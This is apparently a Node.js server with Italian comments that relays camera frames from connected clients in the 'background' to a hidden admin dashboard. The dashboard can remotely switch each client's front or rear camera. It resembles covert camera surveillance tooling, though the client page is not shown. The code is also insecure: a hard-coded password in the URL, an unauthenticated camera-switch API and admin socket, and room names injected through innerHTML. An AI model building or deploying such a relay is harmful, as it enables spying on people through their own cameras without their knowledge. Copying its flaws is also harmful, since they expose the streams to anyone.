const express = require('express');
const WebSocket = require('ws');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Servi pagina utente
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Mappa per tenere traccia delle preferenze della fotocamera per ogni stanza
const cameraPreferences = new Map(); // room -> 'user' | 'environment'

// Dashboard admin con password
app.get('/admin', (req, res) => {
  if (req.query.pass !== 'secret123') {
    return res.status(403).send('Accesso negato');
  }
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// API per cambiare la fotocamera
app.post('/api/switch-camera', (req, res) => {
  const { room } = req.query;
  if (!room) {
    return res.status(400).json({ error: 'Room parameter required' });
  }

  const currentMode = cameraPreferences.get(room) || 'environment';
  const newMode = currentMode === 'environment' ? 'user' : 'environment';
  cameraPreferences.set(room, newMode);

  // Notifica il client del cambio
  const client = clients.get(room);
  if (client && client.readyState === WebSocket.OPEN) {
    client.send(JSON.stringify({ type: 'switch-camera', mode: newMode }), (err) => {
      if (err) {
        console.error('Errore invio comando switch camera:', err);
        return res.status(500).json({ error: 'Failed to notify client' });
      }
      res.json({ success: true, mode: newMode });
    });
  } else {
    res.json({ success: false, error: 'Client not connected' });
  }
});

// === ADMIN DASHBOARD (admin.html) ===
const adminHtml = `
<!DOCTYPE html>
<html><head><title>Live Background Cam</title>
<style>
  body { margin:0; background:#000; color:#0f0; font-family:Arial; padding:20px; }
  .grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(340px,1fr)); gap:15px; }
  .cam { border:2px solid #0f0; border-radius:12px; overflow:hidden; background:#111; }
  img { width:100%; height:auto; display:block; }
  h2 { margin:0; padding:8px; background:#0f0; color:#000; font-size:14px; text-align:center; }
  .status { color:#0f0; font-size:12px; text-align:center; padding:4px; }
  .debug { position:fixed; bottom:0; left:0; right:0; background:rgba(0,0,0,0.8); color:#0f0; padding:10px; font-size:12px; max-height:100px; overflow-y:auto; }
</style></head>
<body>
  <h1>Camera in Background</h1>
  <div id="grid" class="grid"></div>
  <div id="debug" class="debug"></div>
  <script>
    const grid = document.getElementById('grid');
    const debug = document.getElementById('debug');
    let ws;
    const rooms = new Map();
    
    function log(msg) {
      const div = document.createElement('div');
      div.textContent = new Date().toISOString() + ': ' + msg;
      debug.appendChild(div);
      if (debug.children.length > 20) debug.removeChild(debug.firstChild);
    }
    
    function connectWebSocket() {
      const proto = (location.protocol === 'https:') ? 'wss' : 'ws';
      ws = new WebSocket(proto + '://' + location.host + '/bg-admin');
      
      ws.onopen = () => {
        log('WebSocket connesso');
        // Aggiungi pulsante switch camera a tutte le stanze esistenti
        rooms.forEach((div, roomId) => {
          addSwitchButton(roomId);
        });
      };
      
      ws.onclose = () => {
        log('WebSocket disconnesso - riconnessione...');
        setTimeout(connectWebSocket, 3000);
      };
      
      ws.onerror = (error) => {
        log('Errore WebSocket: ' + error);
      };
      
      return ws;
    }
    
    function addSwitchButton(roomId) {
      const div = rooms.get(roomId);
      if (!div) return;
      
      // Rimuovi bottone esistente se presente
      const oldBtn = div.querySelector('button');
      if (oldBtn) oldBtn.remove();
      
      const btn = document.createElement('button');
      btn.textContent = 'Cambia Camera';
      btn.style.cssText = 'margin:8px; padding:5px 10px; background:#0f0; color:#000; border:none; border-radius:4px; cursor:pointer;';
      btn.onclick = async () => {
        try {
          const response = await fetch(\`/api/switch-camera?room=\${roomId}\`, {
            method: 'POST'
          });
          const result = await response.json();
          if (result.success) {
            log('Camera cambiata per ' + roomId);
          } else {
            throw new Error(result.error || 'Errore cambio camera');
          }
        } catch (err) {
          log('Errore cambio camera: ' + err.message);
        }
      };
      div.appendChild(btn);
    }
    
    connectWebSocket();

    let lastRoom = null;
    
    ws.onmessage = (e) => {
      try {
        // Se è una stringa, è un messaggio di controllo
        if (typeof e.data === 'string') {
          const data = JSON.parse(e.data);
          log('Ricevuto messaggio: ' + JSON.stringify(data));
          
          if (data.offline) {
            const statusEl = document.getElementById('status-' + data.room);
            if (statusEl) statusEl.textContent = 'Offline';
            return;
          }
          
          if (!data.room) return;
          lastRoom = data.room;
          
          if (!rooms.has(data.room)) {
            const div = document.createElement('div');
            div.className = 'cam';
            div.innerHTML = \`
              <h2>\${data.room}</h2>
              <img id="img-\${data.room}">
              <div class="status" id="status-\${data.room}">Online</div>
            \`;
            grid.appendChild(div);
            rooms.set(data.room, div);
            log('Nuova stanza creata: ' + data.room);
          }
          document.getElementById('status-' + data.room).textContent = 'Live';
        } 
        // Se è un Blob, è un frame video
        else if (e.data instanceof Blob) {
          log('Ricevuto blob: ' + e.data.size + ' bytes');
          if (lastRoom) {
            const img = document.getElementById('img-' + lastRoom);
            if (img) {
              // Creiamo un URL dal blob
              const url = URL.createObjectURL(e.data);
              // Aggiorniamo il timestamp per debug
              const statusEl = document.getElementById('status-' + lastRoom);
              if (statusEl) {
                const now = new Date().toLocaleTimeString();
                statusEl.textContent = 'Live - Frame: ' + now;
                statusEl.style.color = '#0f0'; // Verde per indicare attivo
              }
              
              // Pulisci la vecchia URL quando l'immagine è caricata
              const oldSrc = img.src;
              img.onload = () => {
                if (oldSrc) URL.revokeObjectURL(oldSrc);
                log('Frame mostrato per ' + lastRoom);
              };
              img.onerror = (err) => {
                log('Errore caricamento frame: ' + err);
                if (statusEl) {
                  statusEl.textContent = 'Errore frame: ' + err;
                  statusEl.style.color = '#f00'; // Rosso per indicare errore
                }
              };
              img.src = url;
            } else {
              log('Elemento img non trovato per ' + lastRoom);
            }
          } else {
            log('Ricevuto blob ma nessuna stanza attiva');
          }
        }
      } catch(err) {
        log('Errore: ' + err.message);
        console.error('Error processing message:', err);
      }
    };
  </script>
</body></html>
`;

// Salva admin.html dinamicamente
const fs = require('fs');
fs.writeFileSync('admin.html', adminHtml);

app.get('/admin.html', (req, res) => res.sendFile(path.join(__dirname, 'admin.html')));

// === WEBSOCKET: Streaming in background ===
const bgWss = new WebSocket.Server({ noServer: true });
const adminWss = new WebSocket.Server({ noServer: true });

const clients = new Map(); // room → ws

bgWss.on('connection', (conn, req) => {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const room = url.searchParams.get('room') || 'unknown';

  clients.set(room, conn);

  conn.on('message', async (data) => {
    if (typeof data === 'string' && data === 'ping') return;

    // Invia a tutti gli admin
    adminWss.clients.forEach(async (client) => {
      if (client.readyState === WebSocket.OPEN) {
        try {
          // Prima invia info sulla stanza
          await new Promise((resolve, reject) => {
            client.send(JSON.stringify({ 
              room, 
              timestamp: Date.now() 
            }), (err) => {
              if (err) reject(err);
              else resolve();
            });
          });
          
          // Piccola pausa per assicurarsi che il messaggio di controllo arrivi prima
          await new Promise(resolve => setTimeout(resolve, 50));
          
          // Poi invia il frame video
          if (Buffer.isBuffer(data) || data instanceof Blob) {
            await new Promise((resolve, reject) => {
              client.send(data, { binary: true }, (err) => {
                if (err) reject(err);
                else resolve();
              });
            });
          }
        } catch (err) {
          console.error('Errore invio a client:', err);
        }
      }
    });
  });

  conn.on('close', () => {
    clients.delete(room);
    // Notifica admin che è offline
    adminWss.clients.forEach(c => {
      if (c.readyState === WebSocket.OPEN) {
        c.send(JSON.stringify({ room, offline: true }));
      }
    });
  });
});

// Admin si connette qui
adminWss.on('connection', (ws) => {
  ws.send(JSON.stringify({ type: 'welcome' }));
});

const server = app.listen(PORT, () => {
  console.log(`Server: https://localhost:${PORT}`);
});

server.on('upgrade', (req, socket, head) => {
  const pathname = new URL(req.url, `http://${req.headers.host}`).pathname;

  if (pathname === '/bg-stream') {
    bgWss.handleUpgrade(req, socket, head, ws => {
      bgWss.emit('connection', ws, req);
    });
  } else if (pathname === '/bg-admin') {
    adminWss.handleUpgrade(req, socket, head, ws => {
      adminWss.emit('connection', ws, req);
    });
  } else {
    socket.destroy();
  }
});
